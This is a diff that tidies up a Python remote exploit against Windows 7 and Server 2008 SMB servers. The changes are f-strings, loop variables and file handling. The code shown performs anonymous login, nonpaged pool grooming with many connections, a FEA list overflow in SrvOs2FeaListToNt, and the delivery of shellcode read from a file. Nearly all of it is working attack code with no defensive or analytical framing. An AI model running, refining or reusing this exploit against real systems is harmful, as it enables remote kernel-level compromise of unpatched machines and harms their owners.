@@ -407,16 +407,15 @@ def send_nt_trans(conn, tid, setup, data, param, firstDataFragmentSize, sendLast
 
 	conn.sendSMB(pkt)
 	conn.recvSMB() # must be success
-	
+
 	i = firstDataFragmentSize
 	while i < len(data):
 		sendSize = min(4096, len(data) - i)
-		if len(data) - i <= 4096:
-			if not sendLastChunk:
-				break
+		if len(data) - i <= 4096 and not sendLastChunk:
+			break
 		send_trans2_second(conn, tid, data[i:i+sendSize], i)
 		i += sendSize
-	
+
 	if sendLastChunk:
 		conn.recvSMB()
 	return i
@@ -455,11 +454,11 @@ def exploit(target, shellcode, numGroomConn):
 	# can use conn.login() for ntlmv2
 	conn.login_standard('', '')
 	server_os = conn.get_server_os()
-	print('Target OS: '+server_os)
+	print(f'Target OS: {server_os}')
 	if not (server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 ")):
 		print('This exploit does not support this target')
 		sys.exit()
-	
+
 
 	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
 
@@ -471,7 +470,7 @@ def exploit(target, shellcode, numGroomConn):
 	#   - Dispatch table is defined at srvdata.c#L972 (target is command 0, SrvSmbOpen2() function)
 	# - SrvSmbOpen2() (smbopen.c#L1002)
 	#   - call SrvOs2FeaListToNt() (smbopen.c#L1095)
-	
+
 	# https://msdn.microsoft.com/en-us/library/ee441720.aspx
 	# Send special feaList to a target except last fragment with SMB_COM_NT_TRANSACT and SMB_COM_TRANSACTION2_SECONDARY command
 	# Note: cannot use SMB_COM_TRANSACTION2 for the exploit because the TotalDataCount field is USHORT
@@ -485,11 +484,11 @@ def exploit(target, shellcode, numGroomConn):
 	# create buffer size NTFEA_SIZE-0x1000 at server
 	# this buffer MUST NOT be big enough for overflown buffer
 	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
-	
+
 	# groom nonpaged pool
 	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
 	srvnetConn = []
-	for i in range(numGroomConn):
+	for _ in range(numGroomConn):
 		sk = createConnectionWithBigSMBFirst80(target)
 		srvnetConn.append(sk)
 
@@ -501,13 +500,13 @@ def exploit(target, shellcode, numGroomConn):
 	allocConn.get_socket().close()
 
 	# hope one of srvnetConn is next to holeConn
-	for i in range(5):
+	for _ in range(5):
 		sk = createConnectionWithBigSMBFirst80(target)
 		srvnetConn.append(sk)
-		
+
 	# send echo again, all new 5 srvnet buffers should be created
 	#sendEcho(conn, tid, 'a'*12)
-	
+
 	# remove holeConn to create hole for fea buffer
 	holeConn.get_socket().close()
 
@@ -520,7 +519,7 @@ def exploit(target, shellcode, numGroomConn):
 		print('good response status: INVALID_PARAMETER')
 	else:
 		print('bad response status: 0x{:08x}'.format(retStatus))
-		
+
 
 	# one of srvnetConn struct header should be modified
 	# a corrupted buffer will write recv data in designed memory address
@@ -538,16 +537,14 @@ def exploit(target, shellcode, numGroomConn):
 
 
 if len(sys.argv) < 3:
-	print("{} <ip> <shellcode_file> [numGroomConn]".format(sys.argv[0]))
+	print(f"{sys.argv[0]} <ip> <shellcode_file> [numGroomConn]")
 	sys.exit(1)
 
 TARGET=sys.argv[1]
 numGroomConn = 13 if len(sys.argv) < 4 else int(sys.argv[3])
 
-fp = open(sys.argv[2], 'rb')
-sc = fp.read()
-fp.close()
-
+with open(sys.argv[2], 'rb') as fp:
+	sc = fp.read()
 print('shellcode size: {:d}'.format(len(sc)))
 print('numGroomConn: {:d}'.format(numGroomConn))
 
